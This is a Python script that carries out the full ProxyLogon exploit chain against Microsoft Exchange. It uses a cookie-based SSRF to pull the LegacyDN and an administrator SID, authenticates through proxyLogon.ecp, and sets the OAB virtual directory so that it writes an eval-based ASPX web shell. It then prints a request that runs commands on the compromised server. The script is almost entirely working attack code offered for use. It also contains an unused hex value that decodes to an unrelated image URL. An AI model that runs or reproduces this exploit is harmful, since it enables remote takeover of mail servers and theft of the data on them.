import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import unicodedata
import string
import codecs
import sys


print("   ___                    __                         ")
print("  / _ \_______ __ ____ __/ /  ___  ___ ____  ___     ")
print(" / ___/ __/ _ \\\\ \ / // / /__/ _ \/ _ `/ _ \/ _ \\ ")
print("/_/  /_/  \___/_\_\\\\_, /____/\___/\_, /\___/_//_/  ")
print("                  /___/          /___/               ")
print("                                                     ")

# Generate random set of characters
def generate_random_chars(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


''' Stage 0: Resolve FQDN '''


def exploit_stage0(target, user_agent, random_name):
    print("[Stage 0] Fetch Exchange FQDN from " + target)

    FQDN = "EXCHANGE"  # Set default FQDN to EXCHANGE
    stage1 = requests.get("https://%s/ecp/%s" % (target, random_name),
                          headers={"Cookie": "X-BEResource=localhost~1942062969",
                                   "User-Agent": user_agent},
                          verify=False)

    # Change FQDN to obtained information if X-CalculatedBETarget and X-FEServer are available
    if "X-CalculatedBETarget" in stage1.headers and "X-FEServer" in stage1.headers:
        FQDN = stage1.headers['X-FEServer']
        print("[Stage 0] Fetched FQDN Successfully: " + FQDN)
    return FQDN


''' Stage 1: Autodiscover attack to gain useful information about the target (LegacyDN) '''


def exploit_stage1(target, email, user_agent, random_name, FQDN):
    print("[Stage 1] Performing SSRF attack on endpoint /autodiscover/autodiscover.xml against " + target)

    # Autodiscover schema for requesting the configuration from /autodiscover/autodiscover.xml
    autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>%s</EMailAddress> 
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
    </Autodiscover>
    """ % email

    # Perform the request to the target
    stage1 = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
        "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062969;" % FQDN,
        "Content-Type": "text/xml",
        "User-Agent": user_agent},
                           data=autoDiscoverBody,
                           verify=False
                           )

    # If status code 200 is NOT returned, the request failed
    if stage1.status_code != 200:
        print("[Stage 1] Request failed - Autodiscover Error!")
        exit()

    # If the LegacyDN information is not in the response, the request failed as well
    if "<LegacyDN>" not in stage1.content.decode('utf8').strip():
        print("[Stage 1] Cannot obtain required LegacyDN-information!")
        exit()

    # Define LegacyDN for further use in the script
    legacyDn = stage1.content.decode('utf8').strip().split("<LegacyDN>")[1].split("</LegacyDN>")[0]

    print("[Stage 1] Successfully obtained DN: " + legacyDn)
    return legacyDn


''' Stage 2: Malformed SSRF attack to obtain Security ID (SID) using endpoint /mapi/emsmdb against '''


def exploit_stage2(target, email, user_agent, random_name, legacyDn, FQDN):
    print(
        "[Stage 2] Performing malformed SSRF attack to obtain Security ID (SID) using endpoint /mapi/emsmdb against "
        + target)

    # Malformed MAPI body
    mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

    # Send the request
    stage2 = requests.post("https://%s/ecp/%s" % (target, random_name),
        headers={
        "Cookie": "X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.labs&a=~1942062969;" % FQDN,
        "Content-Type": "application/mapi-http",
        "User-Agent": user_agent,
        "X-RequestId": "1337",
        "X-ClientApplication": "Outlook/15.00.0000.0000",
        # The headers X-RequestId, X-ClientApplication and X-requesttype are required for the request to work
        "x-requesttype": "connect"},
                           data=mapi_body,
                           verify=False
                           )

    if stage2.status_code != 200 or "act as owner of a UserMailbox" not in stage2.content.decode('cp1252').strip():
        print("[Stage 2] Mapi Error!")
        exit()

    sid = stage2.content.decode('cp1252').strip().split("with SID ")[1].split(" and MasterAccountSid")[0]

    if sid.split("-")[-1] != "500":
        print("[Stage 2] User SID not an administrator, fixing user SID%s")
        base_sid = sid.split("-")[:-1]
        base_sid.append("500")
        sid = "-".join(base_sid)

        print("[Stage 2] Got target administrator SID: %s" % sid)
    else:
        print("[Stage 2] Got target administrator SID: %s" % sid)

    print("[Stage 2] Successfully obtained SID: " + sid)
    return sid


''' Stage 3: Performing SSRF attack (ProxyLogon) using the obtained Security ID (SID) 
and LegacyDN on endpoint /ecp/proxyLogon.ecp '''


def exploit_stage3(target, email, user_agent, random_name, sid, FQDN):

    print(
        "[Stage 3] Performing SSRF attack (ProxyLogon) using the obtained Security ID (SID) "
        "and LegacyDN on endpoint /ecp/proxyLogon.ecp against " + target)

    proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
    """ % sid

    stage3 = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
        "Cookie": "X-BEResource=Admin@%s:444/ecp/proxyLogon.ecp?a=~1941962753; " % FQDN,
        "Content-Type": "text/xml",
        "User-Agent": user_agent,
        "msExchLogonAccount": sid,
        "msExchLogonMailbox": sid,
        "msExchTargetMailbox": sid,
    },
                           data=proxyLogon_request,
                           verify=False
                           )

    # Check if the returned HTTP status code is 241 and a cookie is returned,
    # if not, the request is not handled correctly by proxyLogon.ecp
    if stage3.status_code != 241 or not "set-cookie" in stage3.headers:
        print("[Stage 3] Proxylogon Error!")
        exit()

    # Define ASP.NET Session ID and msExchEcpCanary (CSRF) token required for the OABVirtualDirectory actions
    sess_id = stage3.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
    msExchEcpCanary = stage3.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]

    print("[Stage 3] Succesfully obtained ASP.NET_SessionID-cookie: " + sess_id)
    print("[Stage 3] Succesfully obtained msExchEcpCanary-cookie (CSRF): " + msExchEcpCanary)

    # Perform a request to the about.aspx page to confirm that the session ID and CSRF token work
    stage3 = requests.get("https://%s/ecp/%s" % (target, random_name), headers={
        "Cookie": "X-BEResource=Admin@%s:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId=%s;  msExchEcpCanary=%s "
                  % (FQDN, sess_id, msExchEcpCanary),
        "User-Agent": user_agent,
        "msExchLogonAccount": sid,
        "msExchLogonMailbox": sid,
        "msExchTargetMailbox": sid
    },
                          verify=False
                          )

    # If the returned HTTP status code is NOT 200
    if stage3.status_code != 200:
        print("[Stage 3] CSRF Canary-cookie check failed!")
   
    # Return the ASP.NET SessionID and msExchEcpCanary
    return sess_id, msExchEcpCanary


''' Stage 4: Delivering final payload '''


def exploit_stage4(target, email, user_agent, random_name, sess_id, msExchEcpCanary,
                   sid, shell_content, shell_absolute_path, shell_path, FQDN):
    print("[Stage 4] Preparing webshell (aspx) payload")
    print(
        "[Stage 4] Performing SSRF attack to write the output of OABVirtualDirectory using endpoint"
        " /ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory against " + target)

    stage4 = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
        "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
            FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": user_agent,
        "msExchLogonAccount": sid,
        "msExchLogonMailbox": sid,
        "msExchTargetMailbox": sid

    },
                           json={"filter": {
                               "Parameters": {
                                   "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                   "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}},
                           verify=False
                           )

    # Check if the HTTP status code is 200
    if stage4.status_code != 200:
        print("[Stage 4] GetOAB Error!")
        exit()

    # Fetch the oabId from the response
    oabId = stage4.content.decode('utf8').strip().split('"RawIdentity":"')[1].split('"')[0]
    print("[Stage 4] Successfully obtained OAB: " + oabId)

    # Create a JSON containing the oabId and the shell contents
    oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                "properties": {
                    "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                   "ExternalUrl": "http://ffff/#%s" % shell_content}}}

    print(
        "[Stage 4] Performing SSRF attack to change the external url of OABVirtualDirectory using endpoint"
        " /ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory against " + target)

    # Perform a request to inject the malicious json object using the OABVirtualDirectory
    stage4 = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
        "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
            FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": user_agent,
        "msExchLogonAccount": sid,
        "msExchLogonMailbox": sid,
        "msExchTargetMailbox": sid
    },
                           json=oab_json,
                           verify=False
                           )
    if stage4.status_code != 200:
        print("[Stage 4] Set external url Error!")
        exit()

    print("[Stage 4] Delivering the final blow by resetting the OABVirtualDirectory-service")

    # Create a JSON to reset the OAB service
    reset_oab_body = {
        "identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
        "properties": {
            "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                           "FilePathName": shell_absolute_path}}}

    # Perform a request to using the created JSON to reset the OAB service
    stage4 = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
        "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
            FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": user_agent,
        "msExchLogonAccount": sid,
        "msExchLogonMailbox": sid,
        "msExchTargetMailbox": sid
    },
                           json=reset_oab_body,
                           verify=False
                           )

    print("[Stage 4] Attack performed successfully - webshell: https://" + target + "/owa/auth/proxylogon.aspx")
    print("[Stage 4] Use the following POST request to execute commands:")

    print("""
    POST """ + shell_path.replace('\\', '/') + """ HTTP/1.1
    Host: """ + target + """
    User-Agent: Mozilla/5.0
    Content-Type:application/x-www-form-urlencoded
    Content-Length: 115

    proxylogon_shell=Response.Write(new ActiveXObject("Wscript.Shell").exec("cmd.exe /c whoami /all").stdout.readall())
    """)

    if stage4.status_code != 200:
        print("[Stage 4] Write Shell Error!")
        exit()


def main():
    # If there are less then 2 arguments, show the help text and exit
    if len(sys.argv) < 2:
        print("Usage: python ProxyLogon.py <hostname> <email>")
        exit()

    # Disable URLLib3 Warnings
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

    # Define target and e-mail address
    target = sys.argv[1]
    email = sys.argv[2]

    # Define the user agent used in the requests
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"

    # Define the path for shell dropping (relative and absolute)
    os_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy"
    shell_path = "\\owa\\auth\\proxylogon.aspx"
    shell_absolute_path = "\\\\127.0.0.1\\c$\\%s\\%s" % (os_path, shell_path)

    # Define the shell contents
    shell_content = '<script language="JScript" runat="server"> ' \
                    'function Page_Load(){/**/eval(Request["proxylogon_shell"],"unsafe");}' \
                    '</script>'

    # Define legacyDnPatchByte
    legacyDnPatchByte = "68747470733a2f2f696d6775722e636f6d2f612f7a54646e5378670a0a0a0a0a0a0a0a"

    # Generate a random name for the .js file that is used in the requests
    random_name = generate_random_chars(3) + ".js"

    # Fetch FQDN
    FQDN = exploit_stage0(target, user_agent, random_name)

    # Fetch legacyDn values
    legacyDn = exploit_stage1(target, email, user_agent, random_name, FQDN)

    # Fetch SID
    sid = exploit_stage2(target, email, user_agent, random_name, legacyDn, FQDN)

    # Fetch ASP.NET Session ID & msExchEcpCanary
    stage3_values = exploit_stage3(target, email, user_agent, random_name, sid, FQDN)

    # Perform web shell drop
    exploit_stage4(target, email, user_agent, random_name, stage3_values[0], stage3_values[1], sid,
                   shell_content, shell_absolute_path, shell_path, FQDN)


main()
